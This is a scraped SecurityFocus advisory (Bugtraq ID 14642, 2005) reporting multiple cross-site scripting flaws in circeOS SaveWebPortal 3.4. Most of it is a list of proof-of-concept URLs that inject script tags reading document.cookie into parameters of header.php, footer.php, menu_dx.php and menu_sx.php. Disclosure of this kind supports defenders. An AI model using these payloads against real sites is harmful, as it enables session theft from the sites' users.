@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid14642<p><b><span style="font-size: 18pt;">SaveWebPortal Multiple Cross Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/14642/info">info</a><br><a href="http://www.securityfocus.com/bid/14642/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/14642/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/14642/solution">solution</a><br><a href="http://www.securityfocus.com/bid/14642/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				14642
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 23 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Aug 23 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				rgod is credited with the discovery of this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					circeOS SaveWebPortal 3.4 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>The following proof of concept URI are available:<br/><br/>http://www.example.com/saveweb/footer.php?TABLE_Width=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/footer.php?SITE_Author_Domain=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/footer.php?SITE_Author=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/footer.php?L_Info=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/footer.php?L_Help=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/header.php?TABLE_Width=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/header.php?L_Visitors=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/header.php?count=&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/header.php?SITE_Logo="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/header.php?BANNER_Url="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/><br/>http://www.example.com/saveweb/header.php?L_Sunday="}&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/>http://www.example.com/saveweb/header.php?L_Monday="}&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/>and so on...<br/><br/>http://www.example.com/saveweb/header.php?L_January="}&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/>http://www.example.com/saveweb/header.php?L_February="}&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/>and so on...<br/><br/>http://www.example.com/saveweb/header.php?IMAGES_Url="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/>http://www.example.com/saveweb/header.php?L_Info="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/>http://www.example.com/saveweb/header.php?L_Help="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/><br/>http://www.example.com/saveweb/menu_dx.php?L_InsertCorrectly=&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_dx.php?L_MENUDX_Login=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/>http://www.example.com/saveweb/menu_dx.php?L_MENUDX_Username=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/>http://www.example.com/saveweb/menu_dx.php?L_MENUDX_Password=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/>http://www.example.com/saveweb/menu_dx.php?L_Ok=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/>http://www.example.com/saveweb/menu_dx.php?IMAGES_Url="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/>http://www.example.com/saveweb/menu_dx.php?L_MENUDX_Registration="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/>http://www.example.com/saveweb/menu_dx.php?BANNER_Url="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/>http://www.example.com/saveweb/menu_dx.php?L_MENUSX_Newsletter=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/>http://www.example.com/saveweb/menu_dx.php?L_MENUDX_InsertEMail=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--<br/><br/>http://www.example.com/saveweb/menu_sx.php?L_InsertNOK3Char=");}&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Channels=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Home=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Archive=&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_Search=&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_Ok=&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?IMAGES_Url="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Services="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Links="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Newsletter="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Polls="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_ECards="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Downloads="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Community="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Forum="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Chat="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Nicknames="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Membership="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Login="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_UserProfile="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_PasswordForgot="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Logout="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Contacts="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_Guestbook="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://www.example.com/saveweb/menu_sx.php?L_MENUSX_ContactUs="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+	
+		<ul>
+</ul>
+</div>
